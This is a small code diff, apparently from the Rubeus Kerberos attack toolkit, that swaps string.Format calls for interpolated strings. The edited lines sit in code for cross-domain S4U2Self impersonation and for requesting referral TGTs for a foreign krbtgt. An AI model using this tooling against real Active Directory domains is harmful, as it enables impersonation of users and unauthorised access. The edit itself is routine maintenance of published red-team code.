@@ -68,7 +68,7 @@ namespace Rubeus
                             requestDomain = targetDomain;
 
 
-                        KRB_CRED localSelf = CrossDomainS4U2Self(string.Format("{0}@{1}", userName, domain), string.Format("{0}@{1}", targetUser, impersonateDomain), domainController, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, false, altService, s, requestDomain, ptt);
+                        KRB_CRED localSelf = CrossDomainS4U2Self($"{userName}@{domain}", $"{targetUser}@{impersonateDomain}", domainController, ticket, clientKey, etype, Interop.KERB_ETYPE.subkey_keymaterial, false, altService, s, requestDomain, ptt);
                     }
                     else
                     {
@@ -631,12 +631,12 @@ namespace Rubeus
             Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;
 
             // user variables
-            string user = string.Format("{0}@{1}", userName, domain);
-            string target = string.Format("{0}@{1}", targetUser, targetDomain);
+            string user = $"{userName}@{domain}";
+            string target = $"{targetUser}@{targetDomain}";
 
             // First retrieve our service ticket for the target domains KRBTGT from our DC
             Console.WriteLine("[*] Retrieving referral TGT from {0} for foreign domain, {1}, KRBTGT service", domain, targetDomain);
-            byte[] crossBytes = Ask.TGS(userName, domain, ticket, clientKey, etype, string.Format("krbtgt/{0}", targetDomain), Interop.KERB_ETYPE.subkey_keymaterial, "", false, domainController, true);
+            byte[] crossBytes = Ask.TGS(userName, domain, ticket, clientKey, etype, $"krbtgt/{targetDomain}", Interop.KERB_ETYPE.subkey_keymaterial, "", false, domainController, true);
             KRB_CRED crossTGS = new KRB_CRED(crossBytes);
             Interop.KERB_ETYPE crossEtype = (Interop.KERB_ETYPE)crossTGS.enc_part.ticket_info[0].key.keytype;
             byte[] crossKey = crossTGS.enc_part.ticket_info[0].key.keyvalue;
